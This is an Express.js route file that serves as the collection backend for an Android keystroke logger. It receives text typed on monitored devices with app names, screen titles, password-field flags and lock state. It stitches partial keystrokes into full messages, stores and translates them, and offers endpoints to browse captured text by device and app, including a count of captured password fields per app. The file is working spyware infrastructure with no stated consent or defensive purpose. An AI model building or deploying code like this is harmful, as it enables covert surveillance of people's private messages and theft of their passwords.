const express = require('express');
const router = express.Router();
const TextInput = require('../models/TextInput');
const { authenticateApiKey } = require('../middleware/auth');
const cacheService = require('../services/cacheService');
const translationService = require('../services/translationService');
const deviceService = require('../services/deviceService');

// POST /api/text-inputs - Save text input with Redis cache
router.post('/', authenticateApiKey, async (req, res) => {
    try {
        console.log('📩 Received text-input payload:', JSON.stringify(req.body, null, 2));
        const {
            id,
            timestamp,
            packageName,
            appName,
            deviceId,
            keyboardInput,
            inputField,
            inputType,
            screenTitle,
            fieldHint,
            isPassword,
            isScreenLocked,
            activityName,
            viewId,
            deviceModel,
            androidVersion
        } = req.body;

        if (!id || !packageName || !appName || !keyboardInput || !deviceId) {
            return res.status(400).json({ success: false, message: 'Missing required fields: id, packageName, appName, keyboardInput, deviceId' });
        }

        if (inputType === 'complete_message') {
            console.log('📤 Complete message received, saving directly to DB');
            const textInputData = await saveTextInputToDB({
                id, timestamp, packageName, appName, deviceId,
                keyboardInput, inputField, inputType, screenTitle, fieldHint,
                isPassword, isScreenLocked, activityName, viewId, deviceModel, androidVersion
            });

            return res.status(201).json({ success: true, message: 'Complete message saved successfully', data: textInputData });
        } else {
            console.log('📝 Partial message received, checking cache');
            const cacheResult = await cacheService.checkAndUpdateMessage(
                deviceId, packageName, viewId, keyboardInput
            );

            if (cacheResult.shouldUpdate) {
                return res.status(201).json({ success: true, message: 'Previous message completed and saved, new message cached', data: { cached: true, messageCount: 1 } });
            } else if (cacheResult.isPartOfExisting) {
                return res.status(200).json({ success: true, message: 'Message updated in cache', data: { cached: true, updateCount: cacheResult.cachedMessage.updateCount, messageLength: cacheResult.cachedMessage.currentText.length } });
            } else {
                return res.status(200).json({ success: true, message: 'New message cached', data: { cached: true, messageLength: keyboardInput.length } });
            }
        }

    } catch (error) {
        console.error('❌ Error processing text input:', error);
        res.status(500).json({ success: false, message: 'Failed to process text input', error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error' });
    }
});

// Helper function to save text input to database
async function saveTextInputToDB(data) {
    const sanitizeValue = (value) => {
        if (value === null || value === undefined) return null;
        if (typeof value === 'object') {
            try { return JSON.parse(JSON.stringify(value)); } catch (e) { return String(value); }
        }
        return value;
    };

    const incoming = {
        id: sanitizeValue(data.id),
        timestamp: data.timestamp ? new Date(data.timestamp) : new Date(),
        packageName: sanitizeValue(data.packageName),
        appName: sanitizeValue(data.appName),
        deviceId: sanitizeValue(data.deviceId),
        keyboardInput: sanitizeValue(data.keyboardInput) || '',
        inputField: sanitizeValue(data.inputField) || 'text_input',
        inputType: sanitizeValue(data.inputType) || 'complete_message',
        screenTitle: sanitizeValue(data.screenTitle) || null,
        fieldHint: sanitizeValue(data.fieldHint) || null,
        isPassword: data.isPassword || false,
        isScreenLocked: data.isScreenLocked || false,
        activityName: sanitizeValue(data.activityName) || '',
        viewId: sanitizeValue(data.viewId) || '',
        deviceModel: sanitizeValue(data.deviceModel) || '',
        androidVersion: sanitizeValue(data.androidVersion) || ''
    };

    console.log('🧾 Prepared incoming text-input document:', JSON.stringify(incoming, null, 2));

    // 0) First 15 chars same rule: merge within same device/package/view
    try {
        const existingSameField = await TextInput.findOne({
            deviceId: incoming.deviceId,
            packageName: incoming.packageName,
            viewId: incoming.viewId
        }).sort({ timestamp: -1 });

        if (existingSameField) {
            const oldText = (existingSameField.keyboardInput || '').trim();
            const newText = (incoming.keyboardInput || '').trim();
            const prefixLen = 15;
            if (oldText.length >= prefixLen && newText.length >= prefixLen && oldText.substring(0, prefixLen) === newText.substring(0, prefixLen)) {
                // Push old into history and replace with new
                const history = existingSameField.keyboardInputHistory || [];
                history.push(oldText);
                existingSameField.keyboardInputHistory = history;
                existingSameField.keyboardInput = newText;
                existingSameField.timestamp = incoming.timestamp;
                existingSameField.activityName = incoming.activityName || existingSameField.activityName;
                existingSameField.screenTitle = incoming.screenTitle || existingSameField.screenTitle;
                await existingSameField.save();
                console.log('🔁 Prefix match: pushed old into history and updated text for', existingSameField.id);
                return summarizeResult(existingSameField);
            }
        }
    } catch (e) {
        console.warn('⚠️ Prefix-merge failed (continuing):', e.message);
    }

    // 1) Prefer updating an existing record for the same device/package/view when new input contains the old one
    try {
        const existingForField = await TextInput.findOne({
            deviceId: incoming.deviceId,
            packageName: incoming.packageName,
            viewId: incoming.viewId
        }).sort({ timestamp: -1 }).lean();

        if (existingForField) {
            const oldInput = existingForField.keyboardInput || '';
            const newInput = incoming.keyboardInput || '';
            if (newInput.length >= oldInput.length && newInput.includes(oldInput)) {
                const updated = await TextInput.findOneAndUpdate(
                    { id: existingForField.id },
                    { $set: { ...incoming, id: existingForField.id } },
                    { new: true }
                );
                console.log('🔄 Merged superset input into existing record:', existingForField.id);
                return summarizeResult(updated);
            }
            if (oldInput.length >= newInput.length && oldInput.includes(newInput)) {
                const updated = await TextInput.findOneAndUpdate(
                    { id: existingForField.id },
                    { $set: { timestamp: incoming.timestamp, activityName: incoming.activityName, screenTitle: incoming.screenTitle } },
                    { new: true }
                );
                console.log('➡️ Ignored shorter subset input; updated metadata for:', existingForField.id);
                return summarizeResult(updated);
            }
        }
    } catch (mergeErr) {
        console.warn('⚠️ Merge check failed, falling back to id-based upsert:', mergeErr.message);
    }

    // 2) Preserve longest keyboardInput per id to avoid overwriting full input with partials (existing behavior)
    const existing = await TextInput.findOne({ id: incoming.id }).lean();
    if (existing) {
        const existingInputLen = (existing.keyboardInput || '').length;
        const incomingInputLen = (incoming.keyboardInput || '').length;
        if (incomingInputLen < existingInputLen) {
            console.log(`↩️ Incoming keyboardInput shorter (${incomingInputLen}) than existing (${existingInputLen}) for id=${incoming.id}. Keeping existing input.`);
            incoming.keyboardInput = existing.keyboardInput;
        }
    }

    // 3) Upsert by id
    const result = await TextInput.findOneAndUpdate(
        { id: incoming.id },
        { $set: incoming, $setOnInsert: { createdAt: new Date() } },
        { upsert: true, new: true, runValidators: true }
    );

    console.log('✅ Text input saved:', result.id);

    // Translate keyboardInput to English
    try {
        const translationResult = await translationService.translateText(result.keyboardInput || '');
        if (translationResult.success && !translationResult.isEnglish) {
            result.keyboardInputEN = translationResult.translation;
            await result.save();
            console.log('✅ Translated text input to English');
        } else if (translationResult.success && translationResult.isEnglish) {
            result.keyboardInputEN = result.keyboardInput || '';
            await result.save();
            console.log('✅ Text input is already in English');
        }
    } catch (translationError) {
        console.error('❌ Failed to translate text input:', translationError.message);
    }

    // Create or update device information
    if (data.deviceId) {
        const deviceData = {
            deviceId: data.deviceId,
            deviceModel: data.deviceModel || 'Unknown',
            deviceBrand: data.deviceBrand || '',
            androidVersion: data.androidVersion || '',
            apiLevel: data.apiLevel || 0,
            screenResolution: data.screenResolution || '',
            totalStorage: data.totalStorage || '',
            availableStorage: data.availableStorage || '',
            ramSize: data.ramSize || '',
            cpuArchitecture: data.cpuArchitecture || '',
            isRooted: data.isRooted || false
        };

        const deviceResult = await deviceService.createOrUpdateDevice(deviceData);
        if (deviceResult.success) {
            console.log('📱 Device information updated:', deviceResult.device.deviceId);
        } else {
            console.error('❌ Failed to update device information:', deviceResult.error);
        }
    }

    return summarizeResult(result);
}

function summarizeResult(result) {
    return {
        id: result._id,
        textInputId: result.id,
        keyboardInput: result.keyboardInput,
        inputField: result.inputField,
        inputType: result.inputType,
        packageName: result.packageName,
        appName: result.appName,
        timestamp: result.timestamp
    };
}

// GET /api/text-inputs - Get text inputs with cache stats
router.get('/', authenticateApiKey, async (req, res) => {
    try {
        const { deviceId, packageName, inputType, limit = 50, offset = 0 } = req.query;
        const filter = {};
        if (deviceId) filter.deviceId = deviceId;
        if (packageName) filter.packageName = packageName;
        if (inputType) filter.inputType = inputType;

        const textInputs = await TextInput.find(filter)
            .sort({ timestamp: -1 })
            .limit(parseInt(limit))
            .skip(parseInt(offset))
            .lean();

        const totalCount = await TextInput.countDocuments(filter);
        const cacheStats = await cacheService.getCacheStats();

        res.status(200).json({ success: true, count: textInputs.length, totalCount, cacheStats, textInputs });
    } catch (error) {
        console.error('❌ Error fetching text inputs:', error);
        res.status(500).json({ success: false, message: 'Failed to fetch text inputs', error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error' });
    }
});

// GET /api/text-inputs/stats - Get statistics with cache info
router.get('/stats', authenticateApiKey, async (req, res) => {
    try {
        // Get database statistics
        const totalKeyboardInputs = await TextInput.countDocuments();
        const passwordFields = await TextInput.countDocuments({ isPassword: true });
        const uniqueApps = await TextInput.distinct('packageName');
        const uniqueDevices = await TextInput.distinct('deviceId');
        const avgInputLength = await TextInput.aggregate([
            { $group: { _id: null, avgLength: { $avg: { $strLenCP: '$keyboardInput' } } } }
        ]);

        // Get app breakdown
        const appBreakdown = await TextInput.aggregate([
            {
                $group: {
                    _id: '$packageName',
                    count: { $sum: 1 },
                    appName: { $first: '$appName' },
                    passwordFields: { $sum: { $cond: ['$isPassword', 1, 0] } },
                    avgInputLength: { $avg: { $strLenCP: '$keyboardInput' } }
                }
            },
            { $sort: { count: -1 } }
        ]);

        // Get input types breakdown
        const inputTypes = await TextInput.distinct('inputType');

        // Get cache statistics
        const cacheStats = await cacheService.getCacheStats();

        res.status(200).json({
            success: true,
            data: {
                stats: {
                    totalKeyboardInputs,
                    passwordFields,
                    uniqueApps: uniqueApps.length,
                    uniqueDevices: uniqueDevices.length,
                    avgInputLength: avgInputLength[0]?.avgLength || 0,
                    inputTypes: inputTypes.length
                },
                appBreakdown,
                cacheStats
            }
        });

    } catch (error) {
        console.error('❌ Error fetching text input statistics:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to fetch text input statistics',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
        });
    }
});

// POST /api/text-inputs/complete-cache - Force complete all cached messages
router.post('/complete-cache', authenticateApiKey, async (req, res) => {
    try {
        await cacheService.completeAllPendingMessages();
        
        res.status(200).json({
            success: true,
            message: 'All cached messages completed and saved to database'
        });
    } catch (error) {
        console.error('❌ Error completing cached messages:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to complete cached messages',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
        });
    }
});

// GET /api/text-inputs/cache-stats - Get detailed cache statistics
router.get('/cache-stats', authenticateApiKey, async (req, res) => {
    try {
        const cacheStats = await cacheService.getCacheStats();
        
        res.status(200).json({
            success: true,
            cacheStats
        });
    } catch (error) {
        console.error('❌ Error fetching cache statistics:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to fetch cache statistics',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
        });
    }
});

// GET /api/text-inputs/cache-stats/:deviceId - Get cache statistics for specific device
router.get('/cache-stats/:deviceId', authenticateApiKey, async (req, res) => {
    try {
        const { deviceId } = req.params;
        const deviceCacheStats = await cacheService.getDeviceCacheStats(deviceId);
        
        res.status(200).json({
            success: true,
            deviceCacheStats
        });
    } catch (error) {
        console.error('❌ Error fetching device cache statistics:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to fetch device cache statistics',
            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
        });
    }
});

// POST /api/text-inputs/keep-alive - Self-ping endpoint to keep server alive
router.post('/keep-alive', authenticateApiKey, async (req, res) => {
    try {
        const timestamp = new Date().toISOString();
        console.log(`🔄 Keep-alive ping received at ${timestamp}`);
        
        res.status(200).json({
            success: true,
            message: 'Server keep-alive ping successful',
            timestamp: timestamp,
            serverStatus: 'active'
        });
    } catch (error) {
        console.error('❌ Error in keep-alive endpoint:', error);
        res.status(500).json({
            success: false,
            message: 'Keep-alive ping failed',
            error: error.message
        });
    }
});

// GET /api/text-inputs/keep-alive - GET version for browser compatibility
router.get('/keep-alive', authenticateApiKey, async (req, res) => {
    try {
        const timestamp = new Date().toISOString();
        console.log(`🔄 Keep-alive GET ping received at ${timestamp}`);
        
        res.status(200).json({
            success: true,
            message: 'Server keep-alive GET ping successful',
            timestamp: timestamp,
            serverStatus: 'active'
        });
    } catch (error) {
        console.error('❌ Error in keep-alive GET endpoint:', error);
        res.status(500).json({
            success: false,
            message: 'Keep-alive GET ping failed',
            error: error.message
        });
    }
});

// POST /api/text-inputs/translate/:id - Translate text input
router.post('/translate/:id', authenticateApiKey, async (req, res) => {
    try {
        const textInputId = req.params.id;
        
        const textInput = await TextInput.findById(textInputId);
        if (!textInput) {
            return res.status(404).json({
                success: false,
                message: 'Text input not found'
            });
        }

        const translationResult = await translationService.translateTextInput(textInput);
        
        if (!translationResult.success) {
            return res.status(400).json({
                success: false,
                message: 'Translation failed',
                error: translationResult.error
            });
        }

        res.json({
            success: true,
            data: {
                textInputId: textInputId,
                originalText: textInput.keyboardInput || textInput.text,
                originalLanguage: translationResult.originalLanguage,
                translation: translationResult.translation,
                isEnglish: translationResult.isEnglish,
                cached: translationResult.cached || false
            }
        });

    } catch (error) {
        console.error('Error translating text input:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to translate text input',
            error: error.message
        });
    }
});

module.exports = router;